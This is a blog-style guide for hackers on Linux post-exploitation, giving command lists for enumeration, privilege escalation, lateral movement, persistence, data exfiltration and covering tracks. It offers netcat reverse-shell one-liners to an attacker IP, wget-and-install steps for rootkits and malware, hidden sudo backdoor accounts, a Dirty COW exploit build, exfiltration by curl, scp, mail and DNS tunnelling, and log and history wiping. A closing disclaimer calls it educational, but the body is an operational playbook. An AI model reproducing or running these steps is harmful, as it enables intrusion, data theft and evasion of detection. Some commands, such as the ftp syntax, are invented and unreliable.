# Guide: The post-exploitation steps every Hacker should know

---

**Title:** The post-exploitation steps every Hacker should know

**Author:** Andrés Sandoval

**Date:** 2023-05-16

**Description:** Guide for hackers: post-exploitation steps. Covers reconnaissance, persistence, privilege escalation, lateral movement, data exfiltration, and covering tracks. Vital resource for optimizing post-attack actions.

---

**Table of Contents:**

- [Introduction](#introduction)
- [Enumeration](#enumeration)
- [Privilege escalation](#privilege-escalation)
- [Lateral movement](#lateral-movement)
- [Persistence](#persistence)
- [Data exfiltration](#data-exfiltration)
- [Covering tracks](#covering-tracks)

## Introduction

The post-exploitation steps refer to the actions taken by a hacker after successfully compromising a target system or network. These steps are crucial for achieving the hacker's objectives, such as obtaining persistent access, exfiltrating data, or maintaining control over the compromised system. Here are the 7 most important steps:

1. **Enumeration:** The hacker gathers detailed information about the compromised system, including its network configuration, user accounts, running services, and installed software.

2. **Privilege escalation:** The hacker seeks ways to increase their privileges on the compromised system to gain administrative access or higher-level permissions, allowing them to perform more advanced actions.

3. **Lateral movement:** Once inside a network, the hacker explores other systems or devices connected to it, attempting to expand their reach and gain control over additional targets.

4. **Persistence:** The hacker establishes mechanisms to maintain access to the compromised system even after a reboot or system update. This may involve creating backdoors, modifying system configurations, or installing persistent malware.

5. **Data exfiltration:** If the objective is to steal information, the hacker identifies and extracts valuable data from the compromised system. This could include sensitive files, databases, user credentials, or intellectual property.

6. **Covering tracks:** To avoid detection and maintain anonymity, the hacker erases or modifies log files, clears event logs, and removes any evidence of their presence or activities on the compromised system.

7. **Maintaining access:** Depending on the hacker's objectives, they may continue to monitor and control the compromised system, using it as a launching pad for future attacks or as a foothold for further network exploration.

In this short guide, you will find useful commands to accomplish the 7 most important post-exploitation steps described above. You will discover the step-by-step process of best practices that every hacker should know for any **Linux system**.

## Enumeration

Post-exploitation enumeration in Linux systems refers to the process of gathering detailed information about a compromised system after a successful exploitation. It involves identifying and collecting relevant data that allows the hacker to gain a deep understanding of the compromised system, its configuration, users, running services, networks, and other important characteristics.

Some aspects that can be explored during post-exploitation enumeration in Linux systems include:

1. **System information:**
   - `uname -a`: Displays comprehensive information about the operating system, kernel version, and hardware architecture.
   - `lsb_release -a`: Provides information about the Linux distribution.
   - `cat /etc/issue`: Shows the contents of the `/etc/issue` file, which often contains information about the operating system and distribution.

2. **Users and groups:**
   - `cat /etc/passwd`: Lists user accounts on the system.
   - `cat /etc/group`: Displays information about groups on the system.

3. **Network configuration:**
   - `ifconfig` or `ip addr show`: Shows network interfaces and their configurations, including IP addresses.
   - `netstat -tuln`: Provides information about network connections, open ports, and listening services.

4. **Running processes:**
   - `ps aux`: Lists running processes and their details, including the user who owns the process.
   - `lsof -i`: Displays open network connections and associated processes.

5. **Files and directories:**
   - `ls -alh /path/to/directory`: Lists files and directories in a specific location, including hidden files.
   - `find /path/to/search -type f -name "*.txt"`: Searches for files with a specific extension, such as `.txt`, in a specified directory or path.

6. **Services and applications:**
   - `systemctl list-units --type=service`: Lists active services on the system.
   - `dpkg -l` or `rpm -qa`: Shows installed packages and their versions.

7. **System logs:**
   - `/var/log/syslog` or `/var/log/messages`: Access system logs to review events, activities, or errors.

These commands can help you gather valuable information during post-exploitation enumeration on a Linux system.

## Privilege escalation

Post-exploitation privilege escalation in Linux systems refers to the process of searching for and exploiting vulnerabilities or weaknesses in a compromised system with the aim of elevating the hacker's privileges. In other words, it involves obtaining administrative or higher-level permissions in the system after a successful exploitation.

When a hacker initially gains access to a compromised system with limited privileges, such as a standard user account, their goal may be to obtain a higher level of access to perform more advanced actions and potentially gain full control over the system.

Here is a more comprehensive and detailed list of useful commands for performing post-exploitation privilege escalation on Linux systems:

1. **Local Vulnerability Search:**
   - `find / -perm -u=s -type f 2>/dev/null`: Searches for files with the SUID bit set, which can allow the execution of commands with elevated privileges.
   - `find / -perm -g=s -type f 2>/dev/null`: Searches for files with the SGID bit set, which can allow the execution of commands with group privileges.
   - `find / -perm -o=w -type f 2>/dev/null`: Searches for files with write permissions for all users, indicating potential insecure configurations.

2. **Exploitation of Known Vulnerabilities:**
   - `searchsploit <keyword>`: Searches for known exploits in the Exploit Database based on a specific keyword.
   - `msfconsole`: Opens the Metasploit framework, which provides a wide range of exploits and post-exploitation tools.

3. **Exploitation of Running Services and Daemons:**
   - `netstat -tuln`: Displays the listening ports and services on the system.
   - `nmap -p- <target>`: Performs a full port scan on the target, identifying potential vulnerable services.
   - `nc -nlvp <port>`: Sets up a listener on a specific port to receive incoming connections and establish a reverse shell session.

4. **Command Injection:**
   - `;` or `&&`: Allows executing multiple commands on a single line by separating them with a semicolon (;) or double ampersand (&&).
   - `$(command)`: Executes a command and uses its output as part of another command.
   - `` `command` ``: Performs the same function as $(command), executing the command and using its output.

5. **Utilizing Known Privilege Escalation Techniques:**
   - `sudo -l`: Shows the commands that the current user can execute with sudo privileges.
   - `sudo -u <user> <command>`: Executes a command as the specified user.
   - `sudoedit <file>`: Edits a file with sudo permissions, using the default text editor configured on the system.

## Lateral movement

Lateral movement in post-exploitation refers to the process of moving laterally within a compromised Linux system or network after gaining an initial foothold. It involves exploring and accessing other systems, devices, or network segments connected to the compromised system in order to expand the hacker's control and reach.

The objective of lateral movement is to escalate privileges, gather additional information, and maintain persistence within the network. By moving laterally, the hacker can explore new targets, compromise more systems, and potentially gain access to critical resources or sensitive data.

During lateral movement in a Linux system, various techniques and tools can be used, such as:

1. **Exploiting shared credentials:**
   - `ssh <target>`: Use compromised or weakly protected SSH credentials to gain unauthorized access to other systems within the network.
   - `su <username>`: Switch to another user account using compromised or shared credentials.
   - `sudo -u <username> <command>`: Execute a command with the privileges of another user.

2. **Exploiting trust relationships:**
   - `ping -c 1 <target>`: Check connectivity to other systems within the network.
   - `nmap -p- <target>`: Perform a port scan to identify open ports and potential targets for lateral movement.
   - `nc -z -v <target> <port>`: Test network connectivity to specific ports on remote systems.

3. **Remote command execution:**
   - `ssh <target> "<command>"`: Execute a command on a remote system using SSH.
   - `telnet <target> <port>`: Establish a telnet connection to a remote system and execute commands.
   - `nc -e /bin/sh <target> <port>`: Open a remote shell on a target system using netcat.

4. **Privilege escalation on new targets:**
   - `sudo -l`: List the available sudo privileges for the current user.
   - `find / -perm -4000 -type f 2>/dev/null`: Search for SUID binaries that can be exploited for privilege escalation.
   - `ps -ef | grep root`: Identify processes running with root privileges on the compromised system.

5. **Exploiting vulnerabilities on other systems:**
   - `searchsploit <vulnerability>`: Search the Exploit Database for known vulnerabilities and corresponding exploits.
   - `metasploit`: Launch the Metasploit Framework to leverage exploits for specific vulnerabilities.
   - `nmap --script vuln <target>`: Perform a vulnerability scan on the target system using Nmap.

6. **Pivoting through compromised hosts:**
   - `ssh -D <localport> <gateway>`: Create a dynamic SSH tunnel to use the compromised system as a proxy for accessing other systems.
   - `proxychains <command>`: Run a command through a proxy server to access systems behind the compromised host.

## Persistence

 Persistence in post-exploitation refers to the ability of a hacker to maintain access and control over a compromised Linux system even after a reboot or system updates. It involves establishing mechanisms or backdoors that allow the hacker to regain access to the system without going through the initial exploitation process again.

The objective of persistence is to ensure that the hacker can maintain a long-term presence and control over the compromised system, facilitating continued exploitation or further attacks on the network. It involves techniques that enable the hacker to maintain stealth, avoid detection, and ensure persistent access.

Some common techniques used for persistence in Linux systems include:

1. **Backdoors:**
   - Create a hidden user account:

     ```
     sudo useradd -m -G sudo -s /bin/bash <username>
     sudo passwd <username>
     ```

   - Modify existing user account privileges:

     ```
     sudo usermod -aG sudo <username>
     ```

2. **Rootkits:**
   - Install and configure a rootkit:

     ```
     # Replace <rootkit> with the desired rootkit name
     wget <rootkit_url>
     tar -xzf <rootkit.tar.gz>
     cd <rootkit>
     make
     make install
     ```

3. **Cron Jobs:**
   - Create a cron job to execute a command/script:

     ```
     crontab -e
     # Add the following line to the crontab file
     * * * * * <command/script>
     ```

4. **Startup Scripts:**
   - Modify system startup script (e.g., rc.local):

     ```
     sudo nano /etc/rc.local
     # Add the following line before "exit 0"
     <command/script>
     ```

5. **Malware Persistence:**
   - Install a persistent malware or Trojan:

     ```
     # Replace <malware> with the desired malware name
     wget <malware_url>
     chmod +x <malware>
     sudo mv <malware> /usr/local/bin/

     ```

6. **Kernel-level Exploits:**
   - Exploit a vulnerability in the Linux kernel:

     ```
     # Use a specific kernel exploit tool (e.g., Dirty COW)
     gcc -pthread dirty.c -o dirty -lcrypt
     sudo ./dirty
     ```

It should be noted that these commands are useful for making use of the thousands of useful repositories that one can find throughout the internet.

## Data exfiltration

Data exfiltration in post-exploitation refers to the unauthorized extraction or transfer of sensitive or valuable data from a compromised Linux system. It involves the process of stealing or copying data from the compromised system and transferring it to an external location or unauthorized recipient.

The objective of data exfiltration is often to retrieve valuable information, such as confidential documents, intellectual property, user credentials, financial data, or any other sensitive data that can be monetized or used for malicious purposes.

Various techniques can be employed for data exfiltration in Linux systems, including:

1. **File transfer protocols:**

- Using FTP:
  - Upload a file to an FTP server: `ftp -p <ftp_server> -u <username> -w <password> -put <local_file> <remote_file>`
  - Download a file from an FTP server: `ftp -p <ftp_server> -u <username> -w <password> -get <remote_file> <local_file>`

- Using SCP:
  - Copy a file to a remote server via SCP: `scp <local_file> <username>@<remote_server>:<remote_path>`
  - Copy a file from a remote server via SCP: `scp <username>@<remote_server>:<remote_file> <local_path>`

- Using SFTP:
  - Upload a file to an SFTP server: `sftp <username>@<sftp_server>:/<remote_path>`
  - Download a file from an SFTP server: `sftp <username>@<sftp_server>:/<remote_file> <local_path>`

2. **Email or messaging services:**

- Sending an email with an attachment using the mail command:
  - `echo "Message body" | mail -s "Subject" -a <attachment_file> <recipient_email>`

3. **Web-based methods:**

- Uploading a file to a web server using cURL:
  - `curl -F "file=@<local_file>" <upload_url>`

4. **Covert channels:**

- DNS tunneling with Dnscat2:
  - Set up a DNS tunneling server: `dnscat2 --dns <dns_server> --secret <secret>`
  - Connect to the DNS tunneling server: `dnscat2 --dns <dns_server> --secret <secret>`

5. **Remote access:**

- Using SSH to access and retrieve files from a remote system:
  - `ssh <username>@<remote_server> "cat <file_path>" > <local_file>`

## Covering tracks

Covering tracks in post-exploitation refers to the process of removing or hiding evidence of an attacker's presence and activities on a compromised Linux system. It involves eliminating or altering traces, logs, files, and other indicators that could potentially expose the attacker's actions or identity.

The objective of covering tracks is to maintain stealth, avoid detection by system administrators or security personnel, and prolong the attacker's unauthorized access to the compromised system. By removing or obfuscating evidence, the attacker aims to hinder or delay any investigation into the breach and reduce the chances of being identified or caught.

Various techniques can be employed for covering tracks in Linux systems, including:

1. **Log manipulation:**
   - Edit a log file: `vi /path/to/logfile`
   - Delete a log file: `rm /path/to/logfile`
   - Use Logrotate to manage log files: `logrotate /path/to/logfile`

2. **Clearing command history:**
   - Modify the command history file: `vi ~/.bash_history`
   - Clear the command history: `history -c`

3. **Deleting or altering artifacts:**
   - Delete a file: `rm /path/to/file`
   - Modify a file: `vi /path/to/file`

4. **Obfuscating network traffic:**
   - Use encryption tools like OpenVPN or WireGuard to encrypt network traffic.
   - Set up a proxy server or use tools like Tor to anonymize network connections.
   - Utilize VPN services to hide the source IP address.

5. **Covering identity:**
   - Use anonymization techniques like proxy chains or VPNs.
   - Employ compromised systems as intermediaries or "jump hosts" to mask the true source of attacks.

## Maintaining access

Maintaining access in post-exploitation on Linux systems refers to the process of ensuring continued unauthorized access to a compromised system even after the initial breach or exploitation. It involves establishing persistent mechanisms or backdoors that allow an attacker to regain access to the system at a later time, even if security measures are implemented or the system undergoes changes.

The objective of maintaining access is to enable ongoing control over the compromised system, gather additional information, and potentially launch further attacks. By establishing persistent access, an attacker can maintain a foothold in the compromised environment and continue unauthorized activities without detection.

Various techniques can be employed for maintaining access in Linux systems, including:

1. Backdoors:
   - Modify sudoers file to grant elevated privileges: `sudo visudo`
   - Create a hidden user account: `sudo useradd -m -p <password> -s /bin/bash -G sudo <username>`
   - Install a backdoor through a malicious script: `echo "<malicious_script>" > /path/to/backdoor.sh`

2. Rootkits:
   - Install a rootkit (for educational purposes only): This is not recommended as it is illegal and unethical.

3. Remote administration tools:
   - Establish a reverse shell connection: `nc -nv <attacker_ip> <port> -e /bin/bash`
   - Deploy a remote administration tool like Netcat: `nc -lvp <port>`

4. Persistence mechanisms:
   - Modify system services: `sudo systemctl edit <service_name>`
   - Add a cron job: `crontab -e`
   - Modify the system's .bashrc file: `vi ~/.bashrc`

5. Exploiting unpatched vulnerabilities:
   - Scan for open ports and services: `nmap -p- <IP_address>`
   - Exploit a known vulnerability using Metasploit framework: `msfconsole`

6. File hiding and obfuscation:
   - Hide a file or directory: `mv <file_or_directory> .<hidden_name>`
   - Compress and encrypt files: `tar -czvf <archive_name.tar.gz> <file_or_directory> | gpg -c > <encrypted_archive.tar.gz.gpg>`

7. Information gathering:
   - Enumerate system information: `uname -a; cat /etc/*-release`
   - View running processes: `ps aux`
   - Check network connections: `netstat -antp`

## Important to know

Post-exploitation in hacking refers to the actions taken by a hacker after successfully compromising a target system or network. It involves key stages such as enumeration, privilege escalation, lateral movement, persistence, data exfiltration, covering tracks, and maintaining access. These stages allow the hacker to gather detailed information, elevate privileges, explore other connected systems, establish long-term access, steal valuable data, remove or modify evidence, and monitor and control the compromised system for future attacks. Post-exploitation is crucial for achieving the hacker's objectives and maintaining control over the compromised systems.

It is important to note that maintaining unauthorized access to a system is illegal and strictly prohibited. This information is provided for educational purposes only to raise awareness about potential security vulnerabilities.
